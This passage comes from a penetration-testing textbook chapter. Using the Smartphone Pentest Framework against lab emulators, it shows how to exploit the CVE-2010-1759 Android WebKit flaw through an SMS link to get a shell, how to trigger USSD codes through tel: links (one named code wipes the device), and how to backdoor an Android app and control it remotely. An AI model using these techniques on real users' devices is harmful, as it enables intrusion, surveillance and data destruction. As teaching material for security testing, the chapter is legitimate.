### Listing 20-7: Root SSH Default Password Metasploit Module

If you have a jailbroken iPhone, you can test this module. Metasploit will provide you with a root shell if the login is successful. When finished, type `exit` to close the shell and return to SPF. If your iPhone has SSH enabled, ensure you change the default password from `alpine` immediately.

### Client-Side Attacks

In mobile devices, client-side attacks are more common than remote attacks. Similar to the attacks discussed in Chapter 10, these client-side attacks are not limited to the mobile browser. They can also target other default apps on the device as well as third-party apps that may contain vulnerabilities.

### Client-Side Shell

Let's look at an example of exploiting the WebKit package in a mobile browser to gain a shell on an Android device. This is similar to the browser attacks discussed in Chapter 10. We will exploit a flaw in the mobile browser by enticing the user to open a malicious page. The executed shellcode will be for Android, not Windows, but the overall attack dynamics remain the same, as shown in Listing 20-8.

```plaintext
spf> 6
Choose a social engineering or client side attack to launch:
1.) Direct Download Agent
2.) Client Side Shell
3.) USSD Webpage Attack (Safe)
4.) USSD Webpage Attack (Malicious)

spf> 2
Select a Client Side Attack to Run:
1) CVE=2010-1759 Webkit Vuln Android

spf> 1
Hosting Path: /spfbook2
Filename: /book.html
Delivery Method (SMS or NFC): SMS
Phone Number to Attack: 15555215558
Custom text (y/N)? N
```

#### Listing 20-8: Android Browser Attack

From the main SPF menu, choose `6)` Run a social engineering or client-side attack, then select `2)` Client Side Shell. Next, choose `1)` CVE=2010-1759 Webkit Vuln Android. You will be prompted for the web server path and filename. SPF will generate a malicious page to exploit the CVE-2010-1759 WebKit vulnerability.

You will then be asked how you want to deliver the link to the malicious page. You can use either NFC or SMS. Since our emulator does not support NFC, we will use SMS. Enter the phone number to attack, and send the SMS to your Android 2.1 emulator. When asked if you want to use custom text for the SMS, you can either accept the default or enter something more creative.

SPF will automatically use the attached mobile modem to send the SMS message. The SMS received by the Android 2.1 emulator will appear to come from the Android 4.3 emulator. (Note: Some mobile devices, such as iPhones, have a flaw in their SMS implementation that allows attackers to spoof the sender number.)

The message received will look like this:

```plaintext
15555215554: This is a cool page: http://192.168.20.9/spfbook2/book.html
```

Like the client-side attacks discussed in Chapter 10, this attack relies on the user opening the link in a vulnerable mobile browser. Our Android 2.1 emulator browser is vulnerable to the attack. When the user clicks the link, the browser will attempt to open the page for about 30 seconds before crashing. At that point, you should have a shell waiting for you in SPF. SPF automatically runs the Android equivalent of `whoami` when the shell opens.

Since we attacked the browser, we are running as `app_2`, the mobile browser on our emulator. The shell has all the permissions of the exploited app, allowing you to run any commands available to the browser. For example, you can use `/system/bin/ls` to list the contents of the current directory. When finished, type `exit` to return to SPF.

```plaintext
Connected: Try exit to quit
uid=10002(app_2) gid=10002(app_2) groups=1015(sdcard_rw),3003(inet)
/system/bin/ls
sqlite_stmt_journals
--snip--
exit
```

**Note:** Android is based on a forked Linux kernel, so once you have a shell, you might expect it to behave similarly to a standard Linux environment. However, many common Linux utilities like `cp` are not present. Additionally, the user structure is different, with each app having its own UID. A detailed exploration of Android is beyond the scope of this chapter.

We will look at an alternative way to control exploited Android devices using backdoored apps to call Android APIs later in this chapter. But first, let's examine another client-side attack.

### USSD Remote Control

Unstructured Supplementary Service Data (USSD) is a protocol used by mobile devices to communicate with the mobile network. Dialing specific numbers can trigger certain functions on the device.

In late 2012, it was discovered that some Android devices would automatically open a number they found on a web page in the dialer application. When USSD codes are entered in the dialer, the associated functionality is automatically invoked. This presented an opportunity for attackers to control devices remotely.

Attackers could embed USSD codes in a web page as a phone number, forcing vulnerable devices to perform various actions. For example, the `tel:` tag in a malicious web page tells Android that it is a phone number. When the USSD code `2673855%23` is opened in the dialer, the device performs a factory reset, deleting all user data.

**Note:** The vulnerability is not in the USSD code itself but in the device's implementation of the `tel:` tag. Various USSD tags offer a range of functionalities.

Our example will use a less harmful payload. We will have the device automatically dial a code to display its unique identifier in a pop-up, as shown in Listing 20-10.

```plaintext
spf> 6
Choose a social engineering or client side attack to launch:
1.) Direct Download Agent
2.) Client Side Shell
3.) USSD Webpage Attack (Safe)
4.) USSD Webpage Attack (Malicious)

spf> 3
Hosting Path: /spfbook2
Filename: /book2.html
Phone Number to Attack: 15555215558
```

#### Listing 20-10: Android USSD Attack

To run the safe USSD example in SPF, choose menu option `6`, then `3)` USSD Webpage Attack (Safe). You will be asked for the location of the web server, the name of the malicious page, and the phone number to text it to. Send it to your Android 2.1 emulator.

Open the page in the SMS you receive on the Android 2.1 emulator. Instead of crashing the browser, the dialer app will open, and a pop-up notification will appear, as shown in Figure 20-2.

**Figure 20-2: USSD Autodial**

As it turns out, our emulator has no unique identifier, so the number will be blank. While this example is harmless, other USSD codes can be destructive if opened in the dialer.

**Note:** Both the USSD and WebKit vulnerabilities discussed here have been patched since their discovery. However, Android's security update process is complex due to the variety of devices and manufacturers. Updates are not consistently delivered, meaning many unpatched devices may still be in use, depending on the model and carrier.

### Malicious Apps

Throughout this book, we have explored various types of malicious programs. We created malicious executables with Msfvenom in Chapter 4, uploaded backdoors to vulnerable web servers in Chapter 8, and studied social-engineering attacks in Chapter 11. Mobile devices complicate this issue further. Unlike laptops, mobile devices are marketed with the expectation that users will download numerous apps, making them more susceptible to malware.

Mobile antivirus applications often require extensive permissions and administrative functions to run, and mobile device management solutions typically require additional apps. Users are encouraged to download apps, and mobile malware is on the rise, often in the form of malicious applications. If a user installs a malicious app, the attacker can use Android's APIs to steal data, gain remote control, and even attack other devices.

In the Android security model, apps must request permissions to use potentially dangerous APIs, and users must accept these permissions during installation. Unfortunately, users often grant access to a wide range of permissions. We can use these permissions to control the device without needing to run an additional exploit after the user installs the malicious app.

### Creating Malicious SPF Agents

SPF allows us to create a malicious app with various functionalities. Earlier, we used the SPF app on our pentester-controlled device to allow SPF to use the device's mobile modem and other features. Our goal here is to trick users into installing the SPF agent on target devices.

As of this writing, SPF agents can receive commands by checking in to a web server over HTTP or via hidden SMS messages from an SPF-controlled mobile modem. To be successful, our agent should appear to be an interesting and trustworthy app. We can embed the agent inside any legitimate app: SPF can backdoor a compiled APK file or, if we have the source code, we can backdoor that as well.

#### Backdooring Source Code

Let's use backdooring source code for our example. Choose `1)` Attach Framework to a Deployed Agent/Create Agent at the main SPF menu. SPF includes a couple of app templates that we can use. You can also import any app source code into SPF with option `4`. If you don't have the source code for the app you want to impersonate, you can use option `5` to backdoor a compiled APK. You can even use the Android Master Key vulnerability discovered in 2013 to replace applications already installed on the device with a backdoored version. For now, let's use one of SPF's templates, as shown in Listing 20-11.

```plaintext
spf> 1
Select An Option from the Menu:
1.) Attach Framework to a Deployed Agent
2.) Generate Agent App
3.) Copy Agent to Web Server
4.) Import an Agent Template
5.) Backdoor Android APK with Agent
6.) Create APK Signing Key

spf> 2
1.) MapsDemo
2.) BlankFrontEnd

spf> 1
Phone number of the control modem for the agent: 15555215554
Control key for the agent: KEYKEY1
Webserver control path for agent: /androidagent1

Control Number: 15555215554
Control Key: KEYKEY1
Control Path: /androidagent1
Is this correct? (y/n) y
--snip--
BUILD SUCCESSFUL
```

#### Listing 20-11: Building the Android Agent

Choose `2)` Generate Agent App. We'll use the `MapsDemo` example template distributed with the Android SDK by Google to demonstrate functionality. When prompted, provide the phone number to send SMS commands to, the SPF seven-character key, and the directory to check in for HTTP commands. Use the same values you used when creating the SPF app ("Building the Android App" on page 449). Use the Android 4.3 emulator (SPF app) phone number as the control phone number. SPF will build the Android agent in the chosen template.

To entice the user into downloading and installing the agent, follow the steps in Listing 20-12.

```plaintext
spf> 6
Choose a social engineering or client side attack to launch:
1.) Direct Download Agent
2.) Client Side Shell
3.) USSD Webpage Attack (Safe)
4.) USSD Webpage Attack (Malicious)

spf> 1
This module sends an SMS with a link to directly download and install an Agent
Deliver Android Agent or Android Meterpreter (Agent/meterpreter:) Agent
Hosting Path: /spfbook3
Filename: /maps.apk
Delivery Method (SMS or NFC): SMS
Phone Number to Attack: 15555215556
Custom text (y/N)? N
```

#### Listing 20-12: Enticing the User into Installing the Agent

Choose option `6` at the main menu, then select `1)` Direct Download Agent. You will be asked if you want to send the Android agent or Android Meterpreter. Since we are working with the Android agent, choose `Agent`. As usual, you will be prompted for the path, app name on the web server, attack vector, and the number to attack. Instruct SPF to send an SMS with default text to the Android 2.2 emulator.

On the Android 2.2 emulator, click the link in the SMS when it arrives. The app should be downloaded. After it downloads, click `Install`, accept the permissions, and open the app. The agent will look and feel like the original app template (the Google Maps demo), but it will have additional functionality in the background, as shown in Figure 20-3.

**Figure 20-3: Backdoored App**

Now, to attach SPF to the deployed agent. If you send an SMS campaign to many numbers, it's uncertain how many users will install the agent or how quickly. However, the agent has check-in functionality (see Listing 20-13) that will respond to SPF's query to see if it is deployed.

```plaintext
spf> 1
Select An Option from the Menu:
1.) Attach Framework to a Deployed Agent
2.) Generate Agent App
3.) Copy Agent to Web Server
4.) Import an Agent Template
5.) Backdoor Android APK with Agent
6.) Create APK Signing Key

spf> 1
Attach to a Deployed Agent:
This will set up handlers to control an agent that has already been deployed.
Agent URL Path: /androidagent1
Agent Control Key: KEYKEY1
Communication Method (SMS/HTTP): HTTP

URL Path: /androidagent1
Control Key: KEYKEY1
Communication Method (SMS/HTTP): HTTP
Is this correct? (y/N): y
```